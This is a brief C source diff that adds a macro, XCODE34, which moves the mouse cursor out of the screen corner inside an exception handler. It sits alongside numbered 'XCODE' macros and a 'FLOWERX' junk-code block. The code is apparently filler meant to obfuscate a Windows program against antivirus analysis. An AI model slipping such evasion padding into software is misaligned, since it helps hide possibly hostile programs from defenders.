@@ -66,6 +66,7 @@ PROCESS_INFORMATION pi;
 SECURITY_ATTRIBUTES sa;
 HBITMAP	hBitmap;
 HBITMAP *hDib;
+POINT pt;
 
 LPUSER_INFO_1 pBuf1 = NULL;
 LPUSER_INFO_2 pBuf2 = NULL;
@@ -964,6 +965,17 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(33);\
+}
+
+#define XCODE34 __try{\
+	GetCursorPos(&pt);\
+	if (pt.x<10 && pt.y<10)\
+	{\
+		SetCursorPos(pt.x+100, pt.y+100);\
+	}\
+}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(34);\
 }
 #ifdef FLOWERX
 #include "xrand.h"
